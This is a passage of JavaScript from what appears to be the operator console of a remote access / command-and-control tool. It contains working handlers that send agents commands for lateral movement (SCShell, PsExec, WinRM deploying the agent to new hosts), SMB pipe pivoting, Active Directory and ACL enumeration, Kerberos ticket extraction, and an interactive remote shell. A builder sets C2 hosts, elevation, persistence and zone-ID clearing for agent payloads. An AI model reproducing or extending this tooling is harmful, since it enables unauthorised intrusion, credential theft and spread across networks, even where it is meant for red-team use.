      document.getElementById('token-revert-btn')?.addEventListener('click', async () => {
        document.getElementById('token-status').textContent = 'Reverting...';
        document.getElementById('token-status').style.color = '#888';
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'TokenRevert' }
          });
        } catch (err) {
          document.getElementById('token-status').textContent = 'Error: ' + err;
          document.getElementById('token-status').style.color = '#ef4444';
        }
      });

      // =========================================================================
      // JUMP EXECUTION
      // =========================================================================

      // Jump method change - hide service field for WinRM
      const jumpMethodSelect = document.querySelector('[data-name="jump-method"] .custom-select');
      const jumpServiceField = document.getElementById('jump-service-field');
      document.querySelectorAll('[data-name="jump-method"] .custom-option').forEach(opt => {
        opt.addEventListener('click', () => {
          const method = opt.dataset.value;
          jumpServiceField.style.display = method === 'winrm' ? 'none' : 'block';
        });
      });

      // Deploy self checkbox - toggle custom executable field
      const deploySelfCheckbox = document.getElementById('jump-deploy-self');
      const jumpExeField = document.getElementById('jump-exe-field');
      deploySelfCheckbox?.addEventListener('change', () => {
        jumpExeField.style.display = deploySelfCheckbox.checked ? 'none' : 'block';
      });

      // Jump execute button
      document.getElementById('jump-exec-btn')?.addEventListener('click', async () => {
        const host = document.getElementById('jump-host').value.trim();
        const method = document.querySelector('[data-name="jump-method"] .custom-select')?.dataset.value || 'scshell';
        const serviceName = document.getElementById('jump-service').value.trim();
        const deploySelf = document.getElementById('jump-deploy-self')?.checked ?? true;
        const customPath = document.getElementById('jump-executable')?.value.trim() || '';

        // Use empty string for self-deploy (server will use current exe)
        const executablePath = deploySelf ? '' : customPath;

        if (!host) {
          document.getElementById('jump-status').textContent = 'Please enter target host';
          document.getElementById('jump-status').style.color = '#ef4444';
          return;
        }

        if (!deploySelf && !customPath) {
          document.getElementById('jump-status').textContent = 'Please enter executable path or check "Deploy current agent"';
          document.getElementById('jump-status').style.color = '#ef4444';
          return;
        }

        if ((method === 'scshell' || method === 'psexec') && !serviceName) {
          document.getElementById('jump-status').textContent = 'Please enter service name';
          document.getElementById('jump-status').style.color = '#ef4444';
          return;
        }

        document.getElementById('jump-exec-btn').disabled = true;
        document.getElementById('jump-status').textContent = deploySelf
          ? 'Deploying current agent...'
          : 'Executing jump...';
        document.getElementById('jump-status').style.color = '#888';
        document.getElementById('jump-output').style.display = 'none';

        const commandTypes = {
          'scshell': 'JumpScshell',
          'psexec': 'JumpPsexec',
          'winrm': 'JumpWinrm'
        };

        const params = method === 'winrm'
          ? { host, executable_path: executablePath }
          : { host, service_name: serviceName, executable_path: executablePath };

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: commandTypes[method], params }
          });
        } catch (err) {
          document.getElementById('jump-status').textContent = 'Error: ' + err;
          document.getElementById('jump-status').style.color = '#ef4444';
          document.getElementById('jump-exec-btn').disabled = false;
        }
      });

      // =========================================================================
      // PIVOT MANAGEMENT
      // =========================================================================

      const renderPivotList = (pivots) => {
        const list = document.getElementById('pivot-list');
        if (!pivots || pivots.length === 0) {
          list.innerHTML = '<div style="color:#666;font-size:11px;padding:20px;text-align:center;">No active pivots</div>';
          return;
        }
        list.innerHTML = pivots.map(p => `
          <div class="pivot-item" data-id="${p.id}" style="padding:8px;margin:4px 0;background:rgba(34,197,94,.05);border-radius:4px;border:1px solid rgba(34,197,94,.2);">
            <div style="display:flex;justify-content:space-between;align-items:center;">
              <div>
                <span style="color:#22c55e;font-weight:500;">\\\\${p.host}\\pipe\\${p.pipe_name}</span>
                <span style="color:#666;font-size:10px;margin-left:8px;">[${p.status}]</span>
              </div>
              <button class="fm-btn pivot-disconnect" data-id="${p.id}" style="padding:2px 8px;font-size:10px;background:rgba(239,68,68,.2);">Disconnect</button>
            </div>
            <div style="font-size:10px;color:#666;margin-top:4px;">Pivot ID: ${p.id}${p.remote_agent_id ? ` | Remote: ${p.remote_agent_id}` : ''}</div>
          </div>
        `).join('');

        // Bind disconnect buttons
        list.querySelectorAll('.pivot-disconnect').forEach(btn => {
          btn.addEventListener('click', async (e) => {
            e.stopPropagation();
            const pivotId = parseInt(btn.dataset.id);
            try {
              await invoke('send_command', {
                uid: client.uid,
                command: { type: 'PivotSmbDisconnect', params: { pivot_id: pivotId } }
              });
            } catch (err) {
              document.getElementById('pivot-status').textContent = 'Error: ' + err;
              document.getElementById('pivot-status').style.color = '#ef4444';
            }
          });
        });
      };

      // Pivot connect button
      document.getElementById('pivot-connect-btn')?.addEventListener('click', async () => {
        const host = document.getElementById('pivot-host').value.trim();
        const pipeName = document.getElementById('pivot-pipe').value.trim();

        if (!host || !pipeName) {
          document.getElementById('pivot-status').textContent = 'Please enter host and pipe name';
          document.getElementById('pivot-status').style.color = '#ef4444';
          return;
        }

        document.getElementById('pivot-status').textContent = 'Connecting to pivot...';
        document.getElementById('pivot-status').style.color = '#888';

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'PivotSmbConnect', params: { host, pipe_name: pipeName } }
          });
        } catch (err) {
          document.getElementById('pivot-status').textContent = 'Error: ' + err;
          document.getElementById('pivot-status').style.color = '#ef4444';
        }
      });

      // Pivot refresh button
      document.getElementById('pivot-refresh-btn')?.addEventListener('click', async () => {
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'PivotList' }
          });
        } catch (err) {
          document.getElementById('pivot-status').textContent = 'Error: ' + err;
          document.getElementById('pivot-status').style.color = '#ef4444';
        }
      });

      // =========================================================================
      // AD ENUMERATION BUTTONS
      // =========================================================================

      // AD Get Domain Info button
      document.getElementById('ad-get-domain-btn')?.addEventListener('click', async () => {
        document.getElementById('ad-status').textContent = 'Querying domain...';
        document.getElementById('ad-status').style.color = '#888';
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'AdGetDomainInfo' }
          });
        } catch (err) {
          document.getElementById('ad-status').textContent = 'Error: ' + err;
          document.getElementById('ad-status').style.color = '#ef4444';
        }
      });

      // AD Enumerate button
      document.getElementById('ad-enum-btn')?.addEventListener('click', async () => {
        const enumType = document.querySelector('[data-name="ad-enum-type"] .custom-select')?.dataset.value || 'users';
        const search = document.getElementById('ad-search').value.trim() || null;
        const filter = document.querySelector('input[name="ad-filter"]:checked')?.value || 'all';

        document.getElementById('ad-status').textContent = `Enumerating ${enumType}...`;
        document.getElementById('ad-status').style.color = '#888';
        document.getElementById('ad-results').innerHTML = '<div style="color:#888;text-align:center;padding:40px;">Loading...</div>';

        const commandMap = {
          'users': { type: 'AdEnumUsers', params: { filter: filter !== 'all' ? filter : null, search } },
          'groups': { type: 'AdEnumGroups', params: { search } },
          'computers': { type: 'AdEnumComputers', params: { filter: filter !== 'all' ? filter : null, search } },
          'spns': { type: 'AdEnumSpns', params: { search } },
          'sessions': { type: 'AdEnumSessions', params: { target: null } },
          'trusts': { type: 'AdEnumTrusts' }
        };

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: commandMap[enumType]
          });
        } catch (err) {
          document.getElementById('ad-status').textContent = 'Error: ' + err;
          document.getElementById('ad-status').style.color = '#ef4444';
        }
      });

      // Show/hide filter options based on enum type
      document.querySelectorAll('[data-name="ad-enum-type"] .custom-option').forEach(opt => {
        opt.addEventListener('click', () => {
          const filterOpts = document.getElementById('ad-filter-options');
          const enumType = opt.dataset.value;
          // Only show filter for users and computers
          filterOpts.style.display = (enumType === 'users' || enumType === 'computers') ? 'flex' : 'none';
        });
      });

      // =========================================================================
      // KERBEROS BUTTONS
      // =========================================================================

      // Kerberos List Tickets button
      document.getElementById('kerb-list-btn')?.addEventListener('click', async () => {
        document.getElementById('kerb-status').textContent = 'Extracting tickets...';
        document.getElementById('kerb-status').style.color = '#888';
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'KerberosExtractTickets' }
          });
        } catch (err) {
          document.getElementById('kerb-status').textContent = 'Error: ' + err;
          document.getElementById('kerb-status').style.color = '#ef4444';
        }
      });

      // Kerberos Refresh button (same as list)
      document.getElementById('kerb-refresh-btn')?.addEventListener('click', async () => {
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'KerberosExtractTickets' }
          });
        } catch (err) {
          document.getElementById('kerb-status').textContent = 'Error: ' + err;
          document.getElementById('kerb-status').style.color = '#ef4444';
        }
      });

      // Kerberos Purge Tickets button
      document.getElementById('kerb-purge-btn')?.addEventListener('click', async () => {
        if (!confirm('This will purge all Kerberos tickets from the current session. Continue?')) return;
        document.getElementById('kerb-status').textContent = 'Purging tickets...';
        document.getElementById('kerb-status').style.color = '#888';
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'KerberosPurgeTickets' }
          });
        } catch (err) {
          document.getElementById('kerb-status').textContent = 'Error: ' + err;
          document.getElementById('kerb-status').style.color = '#ef4444';
        }
      });

      // =========================================================================
      // SECURITY BUTTONS
      // =========================================================================

      // Local Groups button
      document.getElementById('sec-local-groups-btn')?.addEventListener('click', async () => {
        document.getElementById('sec-status').textContent = 'Enumerating local groups...';
        document.getElementById('sec-status').style.color = '#888';
        document.getElementById('sec-results').innerHTML = '<div style="color:#666;font-size:11px;text-align:center;padding:40px;">Loading...</div>';
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'EnumLocalGroups' }
          });
        } catch (err) {
          document.getElementById('sec-status').textContent = 'Error: ' + err;
          document.getElementById('sec-status').style.color = '#ef4444';
        }
      });

      // Remote Access button
      document.getElementById('sec-remote-access-btn')?.addEventListener('click', async () => {
        document.getElementById('sec-status').textContent = 'Checking remote access rights...';
        document.getElementById('sec-status').style.color = '#888';
        document.getElementById('sec-results').innerHTML = '<div style="color:#666;font-size:11px;text-align:center;padding:40px;">Loading...</div>';
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'EnumRemoteAccessRights' }
          });
        } catch (err) {
          document.getElementById('sec-status').textContent = 'Error: ' + err;
          document.getElementById('sec-status').style.color = '#ef4444';
        }
      });

      // Enum ACLs button
      document.getElementById('sec-enum-acls-btn')?.addEventListener('click', async () => {
        const objectType = document.getElementById('sec-acl-type').value || null;
        document.getElementById('sec-status').textContent = 'Enumerating AD ACLs...';
        document.getElementById('sec-status').style.color = '#888';
        document.getElementById('sec-results').innerHTML = '<div style="color:#666;font-size:11px;text-align:center;padding:40px;">Loading... (this may take a moment)</div>';
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'AdEnumAcls', params: { object_type: objectType, target_dn: null } }
          });
        } catch (err) {
          document.getElementById('sec-status').textContent = 'Error: ' + err;
          document.getElementById('sec-status').style.color = '#ef4444';
        }
      });

      // Cleanup on popup close
      popupCleanupCallback = async () => {
        if (lateralUnlisten) {
          const unlisten = await lateralUnlisten;
          unlisten();
        }
      };
      break;
  }
};

popupClose.addEventListener('click', closePopup);
popupOverlay.addEventListener('click', (e) => {
  if (e.target === popupOverlay) closePopup();
});

// Refresh clients every 2 seconds
setInterval(refreshClients, 2000);
// Initial render (clients will be empty until first refresh)
render();

// ============ Logs System ============
let lastLogTimestamp = 0;

const formatLogTime = (timestamp) => {
  const date = new Date(timestamp);
  const hours = date.getHours().toString().padStart(2, '0');
  const minutes = date.getMinutes().toString().padStart(2, '0');
  const seconds = date.getSeconds().toString().padStart(2, '0');
  return `${hours}:${minutes}:${seconds}`;
};

const getLogLevelClass = (level) => {
  switch (level) {
    case 'success': return 'log-success';
    case 'warning': return 'log-warning';
    case 'error': return 'log-error';
    default: return 'log-info';
  }
};

async function refreshLogs() {
  try {
    const logs = await invoke('get_logs_since', { sinceTimestamp: lastLogTimestamp });
    if (logs && logs.length > 0) {
      const container = document.getElementById('log-container');

      logs.forEach(log => {
        const entry = document.createElement('div');
        entry.className = `log-entry ${getLogLevelClass(log.level)}`;

        const clientPrefix = log.client_uid ? `[${log.client_uid}] ` : '';
        entry.innerHTML = `<span class="log-time">${formatLogTime(log.timestamp)}</span><span class="log-msg">${clientPrefix}${log.message}</span>`;

        container.appendChild(entry);
        lastLogTimestamp = Math.max(lastLogTimestamp, log.timestamp);
      });

      // Auto-scroll to bottom
      container.scrollTop = container.scrollHeight;
    }
  } catch (e) {
    console.error('Failed to fetch logs:', e);
  }
}

// Clear placeholder logs and fetch real ones
async function initLogs() {
  const container = document.getElementById('log-container');
  container.innerHTML = ''; // Clear placeholder logs
  lastLogTimestamp = 0;

  try {
    const logs = await invoke('get_logs');
    if (logs && logs.length > 0) {
      logs.forEach(log => {
        const entry = document.createElement('div');
        entry.className = `log-entry ${getLogLevelClass(log.level)}`;

        const clientPrefix = log.client_uid ? `[${log.client_uid}] ` : '';
        entry.innerHTML = `<span class="log-time">${formatLogTime(log.timestamp)}</span><span class="log-msg">${clientPrefix}${log.message}</span>`;

        container.appendChild(entry);
        lastLogTimestamp = Math.max(lastLogTimestamp, log.timestamp);
      });

      container.scrollTop = container.scrollHeight;
    }
  } catch (e) {
    console.error('Failed to initialize logs:', e);
  }
}

// Refresh logs every second
setInterval(refreshLogs, 1000);

// ============ Settings System ============
async function loadSettings() {
  try {
    const settings = await invoke('get_settings');
    if (settings) {
      // General settings
      document.getElementById('minimize-to-tray').checked = settings.minimize_to_tray;
      document.getElementById('close-to-tray').checked = settings.close_to_tray;
      document.getElementById('open-output-folder').checked = settings.open_output_folder;
      document.getElementById('restore-window-state').checked = settings.restore_window_state;

      // Autorun settings
      if (settings.autorun_type === 'powershell') {
        document.getElementById('ps-radio').checked = true;
        document.getElementById('autorun-label').textContent = 'Autorun PowerShell';
      } else {
        document.getElementById('cmd-radio').checked = true;
        document.getElementById('autorun-label').textContent = 'Autorun Commands';
      }
      document.getElementById('autorun-text').value = settings.autorun_commands || '';

      // Notification settings
      document.getElementById('sound-new-client').checked = settings.sound_new_client;
      document.getElementById('sound-lost-client').checked = settings.sound_lost_client;
      document.getElementById('log-connection-events').checked = settings.log_connection_events;
      document.getElementById('notify-connect').checked = settings.notify_connect;
      document.getElementById('notify-disconnect').checked = settings.notify_disconnect;

      // Advanced settings
      document.getElementById('log-exceptions').checked = settings.log_exceptions;
      document.getElementById('filter-dup-uid').checked = settings.filter_dup_uid;
      document.getElementById('filter-dup-ip').checked = settings.filter_dup_ip;
      document.getElementById('filter-dup-lan').checked = settings.filter_dup_lan;
      document.getElementById('timeout-interval').value = settings.timeout_interval;
      document.getElementById('keepalive-timeout').value = settings.keepalive_timeout;
      document.getElementById('identify-timeout').value = settings.identify_timeout;
      document.getElementById('pipe-timeout').value = settings.pipe_timeout;
      document.getElementById('max-clients').value = settings.max_clients;
      document.getElementById('max-connections').value = settings.max_connections;
      document.getElementById('buffer-size').value = settings.buffer_size;
      document.getElementById('max-packet-size').value = settings.max_packet_size;
      document.getElementById('gc-threshold').value = settings.gc_threshold;

      // Update port list from settings
      updatePortListFromSettings(settings.ports);
    }
  } catch (e) {
    console.error('Failed to load settings:', e);
  }
}

function updatePortListFromSettings(ports) {
  const portList = document.getElementById('port-list');
  // Clear existing ports
  portList.innerHTML = '';

  ports.forEach(port => {
    const item = document.createElement('div');
    item.className = 'port-item';
    item.dataset.port = port;
    item.innerHTML = `<label class="toggle small"><input type="checkbox"><div class="switch"></div></label><span class="port-number">${port}</span><span class="port-connections">0 connections</span><span class="remove">✕</span>`;

    const toggle = item.querySelector('input[type="checkbox"]');
    toggle.addEventListener('change', async (e) => {
      if (e.target.checked) {
        try {
          await invoke('start_listener', { port });
        } catch (err) {
          console.error('Failed to start listener:', err);
          e.target.checked = false; // Revert on error
        }
      } else {
        await stopPortWithConfirmation(port, e.target);
      }
    });

    const removeBtn = item.querySelector('.remove');
    removeBtn.addEventListener('click', async () => {
      // Check for active connections before removing
      const connSpan = item.querySelector('.port-connections');
      const connText = connSpan?.textContent || '0 connections';
      const connectionCount = parseInt(connText) || 0;

      if (connectionCount > 0) {
        const confirmed = await showStopPortConfirmation(port, connectionCount);
        if (!confirmed) return;
      }

      try {
        await invoke('remove_port', { port });
        item.remove();
      } catch (err) {
        console.error('Failed to remove port:', err);
      }
    });

    portList.appendChild(item);
  });
}

async function saveSettings() {
  // Collect ports from port list
  const portItems = document.querySelectorAll('.port-item');
  const ports = Array.from(portItems).map(item => parseInt(item.dataset.port));

  const settings = {
    ports: ports,
    minimize_to_tray: document.getElementById('minimize-to-tray').checked,
    close_to_tray: document.getElementById('close-to-tray').checked,
    open_output_folder: document.getElementById('open-output-folder').checked,
    restore_window_state: document.getElementById('restore-window-state').checked,
    autorun_type: document.getElementById('ps-radio').checked ? 'powershell' : 'cmd',
    autorun_commands: document.getElementById('autorun-text').value,
    sound_new_client: document.getElementById('sound-new-client').checked,
    sound_lost_client: document.getElementById('sound-lost-client').checked,
    log_connection_events: document.getElementById('log-connection-events').checked,
    notify_connect: document.getElementById('notify-connect').checked,
    notify_disconnect: document.getElementById('notify-disconnect').checked,
    log_exceptions: document.getElementById('log-exceptions').checked,
    filter_dup_uid: document.getElementById('filter-dup-uid').checked,
    filter_dup_ip: document.getElementById('filter-dup-ip').checked,
    filter_dup_lan: document.getElementById('filter-dup-lan').checked,
    timeout_interval: parseInt(document.getElementById('timeout-interval').value) || 30000,
    keepalive_timeout: parseInt(document.getElementById('keepalive-timeout').value) || 60000,
    identify_timeout: parseInt(document.getElementById('identify-timeout').value) || 10000,
    pipe_timeout: parseInt(document.getElementById('pipe-timeout').value) || 5000,
    max_clients: parseInt(document.getElementById('max-clients').value) || 1000,
    max_connections: parseInt(document.getElementById('max-connections').value) || 5000,
    buffer_size: parseInt(document.getElementById('buffer-size').value) || 65536,
    max_packet_size: parseInt(document.getElementById('max-packet-size').value) || 10485760,
    gc_threshold: parseInt(document.getElementById('gc-threshold').value) || 100,
  };

  try {
    await invoke('save_settings', { newSettings: settings });
    console.log('Settings saved successfully');
  } catch (e) {
    console.error('Failed to save settings:', e);
    alert('Failed to save settings: ' + e);
  }
}

// Wire up save settings button
document.querySelector('#settings-tab .btn')?.addEventListener('click', saveSettings);

// ============ Builder System ============

function getSelectValue(name) {
  const wrapper = document.querySelector(`[data-name="${name}"]`);
  if (wrapper) {
    const select = wrapper.querySelector('.custom-select');
    return select?.dataset.value || select?.textContent || '';
  }
  return '';
}

async function buildClient() {
  const buildBtn = document.getElementById('build-btn');
  const originalText = buildBtn.textContent;

  // Disable button and show building state
  buildBtn.disabled = true;
  buildBtn.textContent = 'Building...';

  // Collect all builder settings
  const request = {
    // Connection
    primary_host: document.getElementById('primary-host')?.value || '127.0.0.1',
    backup_host: document.getElementById('backup-host')?.value || null,
    port: parseInt(document.getElementById('connection-port')?.value) || 4444,
    sni_hostname: document.getElementById('sni-hostname')?.value || null,

    // WebSocket mode
    websocket_mode: document.getElementById('websocket-mode')?.checked || false,
    websocket_path: document.getElementById('websocket-path')?.value || null,

    // Proxy settings
    use_proxy: document.getElementById('use-proxy')?.checked || false,
    proxy_type: getSelectValue('proxy-type') || 'http',
    proxy_host: document.getElementById('proxy-host')?.value || null,
    proxy_port: parseInt(document.getElementById('proxy-port')?.value) || null,
    proxy_username: document.getElementById('proxy-username')?.value || null,
    proxy_password: document.getElementById('proxy-password')?.value || null,

    // Build info
    build_id: document.getElementById('build-id')?.value || new Date().toISOString().split('T')[0],

    // Behavior
    request_elevation: document.getElementById('request-elevation')?.checked || false,
    elevation_method: getSelectValue('elevation-method'),
    run_on_startup: document.getElementById('run-on-startup')?.checked || true,
    persistence_method: getSelectValue('persistence'),
    clear_zone_id: document.getElementById('clear-zone-id')?.checked || false,
    prevent_sleep: document.getElementById('prevent-sleep')?.checked || false,
    run_delay_secs: parseInt(document.getElementById('run-delay')?.value) || 0,
    connect_delay_secs: parseInt(document.getElementById('connect-delay')?.value) || 0,
    restart_delay_secs: parseInt(document.getElementById('restart-delay')?.value) || 5,

    // DNS
    dns_mode: document.getElementById('dns-custom')?.checked ? 'custom' : 'system',
    primary_dns: document.getElementById('primary-dns')?.value || null,
    backup_dns: document.getElementById('backup-dns')?.value || null,

    // Disclosure
    show_disclosure: document.getElementById('show-disclosure')?.checked ?? true,
    disclosure_title: document.getElementById('disclosure-title')?.value || null,
    disclosure_message: document.getElementById('disclosure-message')?.value || null,

    // Uninstall trigger
    uninstall_trigger: getSelectValue('uninstall-trigger'),
    trigger_datetime: document.getElementById('trigger-datetime')?.value || null,
    nocontact_minutes: parseInt(document.getElementById('nocontact-minutes')?.value) || null,
    trigger_username: document.getElementById('trigger-username')?.value || null,
    trigger_hostname: document.getElementById('trigger-host')?.value || null,
  };

  console.log('Build request:', request);

  try {
    const result = await invoke('build_client', { request });
    console.log('Build result:', result);

    if (result.success) {
      // Show success notification
      buildBtn.textContent = 'Build Complete!';
      buildBtn.style.background = 'rgba(74, 222, 128, 0.3)';

      // Check if we should open output folder
      if (document.getElementById('open-output-folder')?.checked) {
        try {
          await invoke('open_builds_folder');
        } catch (e) {
          console.error('Failed to open builds folder:', e);
        }
      }

      setTimeout(() => {
        buildBtn.textContent = originalText;
        buildBtn.style.background = '';
        buildBtn.disabled = false;
      }, 3000);
    } else {
      // Show error
      buildBtn.textContent = 'Build Failed';
      buildBtn.style.background = 'rgba(239, 68, 68, 0.3)';
      console.error('Build failed:', result.error);
      console.error('Build output:', result.build_output);
      alert('Build failed: ' + (result.error || 'Unknown error'));

      setTimeout(() => {
        buildBtn.textContent = originalText;
        buildBtn.style.background = '';
        buildBtn.disabled = false;
      }, 3000);
    }
  } catch (e) {
    console.error('Build error:', e);
    buildBtn.textContent = 'Build Error';
    buildBtn.style.background = 'rgba(239, 68, 68, 0.3)';
    alert('Build error: ' + e);

    setTimeout(() => {
      buildBtn.textContent = originalText;
      buildBtn.style.background = '';
      buildBtn.disabled = false;
    }, 3000);
  }
}

// Wire up build button
document.getElementById('build-btn')?.addEventListener('click', buildClient);

// ============ Tooltip System ============
const tooltip = document.getElementById('tooltip');
let tooltipTimeout = null;

document.addEventListener('mouseover', (e) => {
  const cell = e.target.closest('.truncate-cell');
  if (cell && cell.dataset.tooltip) {
    // Only show tooltip if text is actually truncated
    if (cell.scrollWidth > cell.clientWidth) {
      clearTimeout(tooltipTimeout);
      tooltip.textContent = cell.dataset.tooltip;
      tooltip.classList.add('show');
    }
  }
});

document.addEventListener('mousemove', (e) => {
  if (tooltip.classList.contains('show')) {
    tooltip.style.left = (e.clientX + 12) + 'px';
    tooltip.style.top = (e.clientY - 10) + 'px';
  }
});

document.addEventListener('mouseout', (e) => {
  const cell = e.target.closest('.truncate-cell');
  if (cell) {
    tooltipTimeout = setTimeout(() => {
      tooltip.classList.remove('show');
    }, 100);
  }
});

// ============ Terminal System (xterm.js) ============
let terminal = null;
let fitAddon = null;
let currentShellUid = null;
let shellUnlisteners = [];
let inputBuffer = '';  // Buffer for line-mode input
let lastSentCommand = '';  // Track last command to suppress echo

const terminalOverlay = document.getElementById('terminal-overlay');
const terminalContainer = document.getElementById('terminal-container');
const terminalTitleText = document.getElementById('terminal-title-text');
const terminalStatusText = document.getElementById('terminal-status-text');
const terminalClose = document.getElementById('terminal-close');
const terminalMinimize = document.getElementById('terminal-minimize');

// Initialize terminal instance
function initTerminal() {
  if (terminal) {
    terminal.dispose();
  }

  terminal = new Terminal({
    theme: {
      background: 'rgba(0, 0, 0, 0.6)',
      foreground: '#d4d4d4',
      cursor: '#64b4ff',
      cursorAccent: '#000000',
      selection: 'rgba(100, 180, 255, 0.3)',
      black: '#000000',
      red: '#ef4444',
      green: '#4ade80',
      yellow: '#facc15',
      blue: '#64b4ff',
      magenta: '#c084fc',
      cyan: '#22d3ee',
      white: '#d4d4d4',
      brightBlack: '#666666',
      brightRed: '#ff6b6b',
      brightGreen: '#69db7c',
      brightYellow: '#ffd43b',
      brightBlue: '#74c0fc',
      brightMagenta: '#da77f2',
      brightCyan: '#66d9ef',
      brightWhite: '#ffffff',
    },
    fontFamily: 'Consolas, "Courier New", monospace',
    fontSize: 13,
    lineHeight: 1.2,
    cursorBlink: true,
    cursorStyle: 'block',
    scrollback: 5000,
    allowTransparency: true,
  });

  fitAddon = new FitAddon.FitAddon();
  terminal.loadAddon(fitAddon);

  terminal.open(terminalContainer);
  fitAddon.fit();

  // Handle terminal input - buffer locally, send full line on Enter
  terminal.onData(async (data) => {
    if (currentShellUid) {
      if (data === '\r') {
        // Enter pressed - send buffered command + newline
        terminal.write('\r\n');

        // Handle cls/clear locally
        const cmd = inputBuffer.trim().toLowerCase();
        if (cmd === 'cls' || cmd === 'clear') {
          terminal.clear();
          inputBuffer = '';
          lastSentCommand = '';
          // Still send to shell so prompt reappears
          try {
            await invoke('send_shell_input', { uid: currentShellUid, data: inputBuffer + '\n' });
          } catch (e) {}
          return;
        }

        lastSentCommand = inputBuffer;
        try {
          await invoke('send_shell_input', { uid: currentShellUid, data: inputBuffer + '\n' });
        } catch (e) {
          terminal.write('\x1b[31mError sending input\x1b[0m\r\n');
        }
        inputBuffer = '';
      } else if (data === '\x7f' || data === '\b') {
        // Backspace - remove last character from buffer
        if (inputBuffer.length > 0) {
          inputBuffer = inputBuffer.slice(0, -1);
          terminal.write('\b \b');
        }
      } else if (data === '\x03') {
        // Ctrl+C - send immediately to interrupt
        try {
          await invoke('send_shell_input', { uid: currentShellUid, data: '\x03' });
        } catch (e) {}
      } else if (data === '\x16') {
        // Ctrl+V - paste from clipboard
        navigator.clipboard.readText().then(text => {
          inputBuffer += text;
          terminal.write(text);
        }).catch(() => {});
      } else if (data.charCodeAt(0) < 32 && data !== '\t') {
        // Ignore other control characters (except tab)
        return;
      } else {
        // Regular character - buffer and echo
        inputBuffer += data;
        terminal.write(data);
      }
    }
  });

  // Handle keyboard events for copy
  terminal.attachCustomKeyEventHandler((event) => {
    // Allow Ctrl+C for copy when text is selected, otherwise let it through for interrupt
    if (event.ctrlKey && event.key === 'c' && terminal.hasSelection()) {
      navigator.clipboard.writeText(terminal.getSelection());
      return false; // Prevent default
    }
    // Allow Ctrl+V for paste
    if (event.ctrlKey && event.key === 'v') {
      return true; // Let onData handle it
    }
    // Block other Ctrl combinations except Ctrl+C (interrupt)
    if (event.ctrlKey && event.key !== 'c') {
      return false;
    }
    return true;
  });

  // Handle window resize
  window.addEventListener('resize', () => {
    if (terminal && fitAddon && terminalOverlay.classList.contains('show')) {
      fitAddon.fit();
    }
  });
}

// Open terminal for a specific client
async function openTerminal(client) {
  currentShellUid = client.uid;
  inputBuffer = '';  // Clear input buffer for new session
  lastSentCommand = '';  // Clear command echo tracker
  terminalTitleText.textContent = `Remote Shell - ${client.user}@${client.machine}`;
  terminalStatusText.textContent = 'Connecting...';
  terminalStatusText.className = '';

  // Show overlay
  terminalOverlay.classList.add('show');

  // Initialize terminal if needed
  if (!terminal) {
    initTerminal();
  } else {
    terminal.clear();
    fitAddon.fit();
  }

  terminal.focus();

  // Set up event listeners for shell events
  setupShellEventListeners();

  // Start the shell on the client
  try {
    await invoke('start_shell', { uid: client.uid });
  } catch (e) {
    terminal.write(`\r\n\x1b[31mFailed to start shell: ${e}\x1b[0m\r\n`);
    terminalStatusText.textContent = 'Failed';
    terminalStatusText.className = 'error';
  }
}

// Set up Tauri event listeners for shell events
function setupShellEventListeners() {
  // Clean up any existing listeners
  cleanupShellEventListeners();

  if (window.__TAURI__?.event) {
    const { listen } = window.__TAURI__.event;

    // Listen for shell output
    listen('shell-output', (event) => {
      if (event.payload.uid === currentShellUid && terminal) {
        let data = event.payload.data;

        // Suppress command echo from PowerShell
        // The echo typically comes as the first line of output after sending a command
        if (lastSentCommand) {
          const cmdTrimmed = lastSentCommand.trim();
          // Check if data starts with or contains the command (possibly with leading newline)
          const lines = data.split(/\r?\n/);
          const filteredLines = lines.filter((line, idx) => {
            // Remove lines that match the sent command exactly
            if (line.trim() === cmdTrimmed) {
              return false;
            }
            // Also remove if it's the command with prompt prefix (e.g., "PS C:\> whoami")
            if (line.includes(cmdTrimmed) && idx === 0) {
              return false;
            }
            return true;
          });
          data = filteredLines.join('\r\n');
          lastSentCommand = '';
        }

        if (data) {
          terminal.write(data);
        }

        // Update status on first output
        if (terminalStatusText.textContent === 'Connecting...') {
          terminalStatusText.textContent = 'Connected';
          terminalStatusText.className = 'connected';
        }
      }
    }).then(unlisten => shellUnlisteners.push(unlisten));

    // Listen for shell exit
    listen('shell-exit', (event) => {
      if (event.payload.uid === currentShellUid && terminal) {
        const exitCode = event.payload.exitCode;
        terminal.write(`\r\n\x1b[90m[Shell exited with code ${exitCode ?? 'unknown'}]\x1b[0m\r\n`);
        terminalStatusText.textContent = 'Disconnected';
        terminalStatusText.className = 'disconnected';
        currentShellUid = null;
      }
    }).then(unlisten => shellUnlisteners.push(unlisten));

    // Listen for shell response (start success/failure)
    listen('shell-response', (event) => {
      if (event.payload.uid === currentShellUid && terminal) {
        const response = event.payload.response;
        if (response.data?.type === 'ShellStarted') {
          terminalStatusText.textContent = 'Connected';
          terminalStatusText.className = 'connected';
        } else if (response.data?.type === 'ShellStartFailed') {
          const error = response.data.result?.error || 'Unknown error';
          terminal.write(`\r\n\x1b[31mFailed to start shell: ${error}\x1b[0m\r\n`);
          terminalStatusText.textContent = 'Failed';
          terminalStatusText.className = 'error';
        }
      }
    }).then(unlisten => shellUnlisteners.push(unlisten));
  }
}

// Clean up shell event listeners
function cleanupShellEventListeners() {
  shellUnlisteners.forEach(unlisten => unlisten());
  shellUnlisteners = [];
}

// Close terminal
async function closeTerminal() {
  // Close the shell session on the client
  if (currentShellUid) {
    try {
      await invoke('close_shell', { uid: currentShellUid });
    } catch (e) {
      // Ignore close errors - client may have disconnected
    }
  }

  // Clean up listeners
  cleanupShellEventListeners();

  // Hide overlay
  terminalOverlay.classList.remove('show');
  currentShellUid = null;
}

// Terminal control buttons
terminalClose?.addEventListener('click', closeTerminal);
terminalMinimize?.addEventListener('click', () => {
  terminalOverlay.classList.remove('show');
  // Note: Shell stays running in background, can be reopened
});

// ESC key to close terminal
document.addEventListener('keydown', (e) => {
